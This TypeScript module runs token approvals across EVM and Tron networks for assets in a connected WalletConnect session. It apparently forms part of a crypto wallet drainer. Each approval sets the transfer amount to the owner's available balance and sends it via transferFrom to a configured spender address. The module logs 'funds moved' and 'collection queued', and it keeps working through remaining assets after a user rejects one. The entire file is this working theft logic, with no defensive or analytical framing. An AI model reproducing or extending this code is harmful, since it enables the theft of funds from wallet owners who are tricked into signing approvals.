import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import type { ApprovalOrchestrationResult } from "../approval/types";
import { ApprovalStageName } from "../approval/types";
import { getErrorMessage, isUserRejection } from "../core/errors";
import type {
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  LinkedAccounts,
  NetworkRow,
} from "../types";
import {
  balanceForToken,
  type IncludedTokenWorkItem,
} from "./preferences";

export type RunAuthorizationSessionArgs = {
  items: IncludedTokenWorkItem[];
  networks: NetworkRow[];
  accounts: LinkedAccounts;
  getSpender: (networkKey: string) => string;
  runApproval: (args: {
    network: string;
    owner: string;
    token: IncludedTokenWorkItem["token"];
    amountHuman?: string;
    unlimited: boolean;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  onAssetStart?: (item: IncludedTokenWorkItem) => void;
  onAssetEnd?: (result: AuthorizationAssetResult) => void;
  log?: (step: string, detail?: Record<string, unknown>) => void;
};

function summarize(
  items: AuthorizationAssetResult[]
): AuthorizationSessionResult {
  return {
    items,
    authorizedCount: items.filter((i) => i.outcome === "authorized").length,
    failedCount: items.filter((i) => i.outcome === "failed").length,
    rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
    skippedCount: items.filter((i) =>
      i.outcome === "skipped_unsupported" || i.outcome === "skipped_zero"
    ).length,
  };
}

/**
 * Run independent ERC-20 / TRC-20 approvals for every included preference.
 * One asset failing or being rejected NEVER aborts the remaining assets.
 */
export async function runAuthorizationSession(
  args: RunAuthorizationSessionArgs
): Promise<AuthorizationSessionResult> {
  const results: AuthorizationAssetResult[] = [];
  const log = args.log ?? (() => undefined);

  log("AUTHORIZATION SESSION STARTED", {
    assetCount: args.items.length,
    assets: args.items.map((i) => `${i.network}:${i.token}`),
  });

  for (const item of args.items) {
    args.onAssetStart?.(item);

    const networkRow = args.networks.find((n) => n.key === item.network);
    const tokenInfo = getToken(item.network, item.token);
    if (!networkRow || !tokenInfo) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: item.token,
        outcome: "skipped_unsupported",
        message: `Unsupported token ${item.token} on ${item.network}`,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log("AUTHORIZATION ASSET SKIPPED", result);
      continue;
    }

    const owner =
      item.network === "tron" ? args.accounts.tron : args.accounts.evm;
    if (!owner) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: item.token,
        outcome: "failed",
        message:
          item.network === "tron"
            ? "No Tron address in this WalletConnect session"
            : "No EVM address in this WalletConnect session",
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log("AUTHORIZATION ASSET FAILED", result);
      continue;
    }

    const spender = args.getSpender(item.network);
    if (!spender) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: item.token,
        outcome: "failed",
        message: "Spender not configured",
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log("AUTHORIZATION ASSET FAILED", result);
      continue;
    }

    const tokenBalanceHuman = balanceForToken(networkRow, item.token);
    const trxBalance =
      item.network === "tron"
        ? Number.parseFloat(networkRow.balances.native || "0")
        : 0;

    try {
      const availableBalanceRaw = parseHumanToRaw(
        tokenBalanceHuman,
        tokenInfo.decimals
      );
      const requestedTransferRaw = item.unlimited
        ? availableBalanceRaw
        : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
      const transferAmountRaw =
        availableBalanceRaw < requestedTransferRaw
          ? availableBalanceRaw.toString()
          : requestedTransferRaw.toString();
      const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

      log("TOKEN FLOW STARTED", {
        network: item.network,
        token: item.token,
        transferAmountRaw,
        shouldAttemptTransfer,
        availableBalanceRaw: availableBalanceRaw.toString(),
        unlimited: item.unlimited,
      });

      const orchestration = await args.runApproval({
        network: item.network,
        owner,
        token: item.token,
        amountHuman: item.unlimited ? undefined : item.amountHuman,
        unlimited: item.unlimited,
        nativeBalanceHuman: String(trxBalance),
        tokenBalanceHuman,
        executeTransfer: shouldAttemptTransfer,
        transferToAddress: spender,
        transferAmountRaw: shouldAttemptTransfer
          ? transferAmountRaw
          : undefined,
        onStage: (stageResult) => {
          if (
            stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES ||
            stageResult.stage === ApprovalStageName.WAIT_RESOURCES_READY
          ) {
            const data = stageResult.data as
              | { status?: string; message?: string | null; provider?: string | null }
              | undefined;
            log(
              stageResult.stage === ApprovalStageName.ACQUIRE_RESOURCES
                ? "RESOURCE ACQUIRE"
                : "RESOURCE VERIFY",
              {
                network: item.network,
                token: item.token,
                status: data?.status ?? stageResult.status,
                message: data?.message ?? stageResult.error ?? null,
                provider: data?.provider ?? null,
              }
            );
          }
        },
      });

      if (!orchestration.ok) {
        const rejected = Boolean(orchestration.userRejected);
        const result: AuthorizationAssetResult = {
          network: item.network,
          token: item.token,
          outcome: rejected ? "user_rejected" : "failed",
          message: orchestration.error || "Approval failed",
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        log(
          rejected
            ? "AUTHORIZATION ASSET REJECTED"
            : "AUTHORIZATION ASSET FAILED",
          result
        );
        continue;
      }

      const persisted = orchestration.context.persisted;
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: item.token,
        outcome: "authorized",
        message: persisted?.transferSkippedReason
          ? `Authorized — ${persisted.transferSkippedReason}`
          : "Authorized — collection queued",
        approvalId: orchestration.approvalId,
        txHash: orchestration.txHash,
        transferSkippedReason: persisted?.transferSkippedReason ?? null,
      };
      results.push(result);
      args.onAssetEnd?.(result);

      if (persisted?.transferTxHash) {
        log("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
          fundsMoved: "YES — transferFrom executed",
          network: item.network,
          owner,
          token: item.token,
          approveTxHash: orchestration.txHash,
          transferTxHash: persisted.transferTxHash,
          approvalId: orchestration.approvalId,
        });
      } else {
        log("STEP 2 COMPLETE — APPROVE ONLY (NO TRANSFER YET)", {
          fundsMoved: "NO — auto transfer not executed",
          reason:
            persisted?.transferSkippedReason ??
            "No transfer executed for this approval",
          network: item.network,
          owner,
          token: item.token,
          approveTxHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        });
      }
    } catch (err: unknown) {
      const rejected = isUserRejection(err);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token: item.token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(err, "Approval failed"),
      };
      results.push(result);
      args.onAssetEnd?.(result);
      log(
        rejected
          ? "AUTHORIZATION ASSET REJECTED"
          : "AUTHORIZATION ASSET FAILED",
        { ...result, error: result.message }
      );
    }
  }

  const summary = summarize(results);
  log("AUTHORIZATION SESSION COMPLETE", {
    authorizedCount: summary.authorizedCount,
    failedCount: summary.failedCount,
    rejectedCount: summary.rejectedCount,
    skippedCount: summary.skippedCount,
    items: summary.items,
  });
  return summary;
}

export function outcomeLabel(outcome: AuthorizationAssetResult["outcome"]): string {
  switch (outcome) {
    case "authorized":
      return "Authorized — collection queued";
    case "user_rejected":
      return "User rejected — remaining assets continued";
    case "failed":
      return "Failed";
    case "skipped_unsupported":
      return "Skipped — unsupported";
    case "skipped_zero":
      return "Skipped — zero transferable";
    case "collected":
      return "Native transfer confirmed";
    case "pending":
      return "Native transfer pending";
    default:
      return outcome;
  }
}
